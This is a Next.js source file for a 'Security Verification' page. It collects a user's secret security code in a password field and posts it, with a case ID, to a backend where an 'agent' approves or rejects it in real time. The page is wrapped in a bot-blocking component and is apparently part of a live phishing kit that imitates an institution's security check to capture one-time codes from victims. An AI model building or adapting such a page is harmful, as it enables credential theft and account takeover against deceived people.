'use client';

import { useCallback, useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { WaitingState } from '@/components/verification/WaitingState';
import { Sidebar } from '@/components/layout/Sidebar';
import Image from 'next/image';

export default function SecretKeyPage() {
  const router = useRouter();
  const params = useParams();
  const sessionUuid = params.sessionUuid as string;
  const { caseId, status, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setError('');

      if (!secretKey.trim()) {
        setError('Please enter your security code');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey,
          }),
        });

        if (!response.ok) {
          const data = await response.json();
          setError(data.error || 'Invalid code. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your secret code...',
          formData: {},
        });

      } catch (err) {
        console.error('Submit error:', err);
        setError('An unexpected error occurred. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [secretKey, caseId, router]
  );

  // Determine waiting state
  const isWaiting = status === 'waiting' || isLoading;
  const hasError = !!error && !isWaiting;

  // Error icon SVG
  const ErrorIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" className="float-left mr-[8px] mt-[1px]">
      <circle cx="8" cy="8" r="8" fill="#d10029" />
      <path d="M7 3h2v6H7V3zm0 8h2v2H7v-2z" fill="#fff" />
    </svg>
  );

  return (
    <BotGuard>
      <div className="flex gap-[30px] items-start pt-[20px] pb-[40px] max-w-[957px] px-[18px] mx-auto md:flex-row flex-col text-[#333]">
        {/* Left Column */}
        <div className="flex-1 w-full max-w-[730px]">
          <h1 className="text-[36px] font-[500] text-black mb-[20px] pl-[8px] leading-[44px]">Security Verification</h1>

          {/* Card */}
          <div className="bg-[#f2f2f2] w-full">
            <fieldset className="w-full border-0 p-0 m-0">
              <legend className="w-full bg-gradient-to-b from-[#f0f0f0] to-[#dedede] border-b border-[#969696] px-[8px] py-[6px] text-[14px] font-bold text-[#34423e] block mb-0 font-sans">Additional security check</legend>

              <ol className="list-none m-0 p-[8px]">
                {/* Error Message Row */}
                {hasError && (
                  <li className="block py-[8px] px-[8px] mb-[8px] bg-[#fcebeb] text-[#d10029] text-[14px] font-[500] border-l-[4px] border-[#d10029]">
                    {error}
                  </li>
                )}

                <li className={`block py-[8px] overflow-hidden border-t-0 ${hasError ? 'bg-[#fcebeb]' : ''}`}>
                  {hasError ? (
                    <>
                      <div className="float-left w-[135px] mr-[15px]">
                        <ErrorIcon />
                        <label htmlFor="secretKey" className="float-left pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px]">Security Code:</label>
                      </div>
                    </>
                  ) : (
                    <label htmlFor="secretKey" className="float-left w-[120px] mr-[15px] pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px]">Security Code:</label>
                  )}

                  <input
                    type="password"
                    id="secretKey"
                    className={`float-left w-[calc(100%-170px)] max-w-[280px] h-[18px] p-[2px] px-[4px] border text-[12px] text-[#333] bg-white rounded-none focus:outline-[2px] focus:outline-[#101010] focus:outline-offset-0 ${hasError ? 'border-[#d10029]' : 'border-[#777777] focus:border-[#777777]'
                      }`}
                    value={secretKey}
                    onChange={(e) => setSecretKey(e.target.value)}
                    disabled={isWaiting}
                    autoComplete="off"
                  />

                  {/* Inline Waiting Message */}
                  {isWaiting && (
                    <div className="clear-both pt-2 block overflow-hidden text-[#00b2a9] text-[12px] pl-[135px] font-bold">
                      Verifying your code... Please wait.
                    </div>
                  )}
                </li>
              </ol>

              {/* Actions */}
              <div className="p-[12px] pb-[8px] px-[8px] border-t border-[#d5d5d5] mt-[4px] overflow-hidden">
                <div className="float-left inline-flex items-center h-[24px] bg-[#00baef] rounded-[12px] pr-[8px]">
                  <span className="flex items-center">
                    <button
                      onClick={handleSubmit}
                      disabled={isWaiting}
                      className="bg-transparent border-0 text-white font-[400] text-[12px] h-[24px] pl-[12px] pr-[2px] cursor-pointer hover:underline focus:outline-none whitespace-nowrap font-sans"
                    >
                      {isWaiting ? 'Verifying...' : 'Continue'}
                    </button>
                  </span>
                  <span className="w-[20px] h-[20px] ml-[8px] bg-[url('/bg-padlock-sprite.png')] bg-no-repeat bg-[length:20px_auto] bg-[0_0]"></span>
                </div>
              </div>
            </fieldset>
          </div>
        </div>

        {/* Right Sidebar */}
        <Sidebar />
      </div>
    </BotGuard>
  );
}
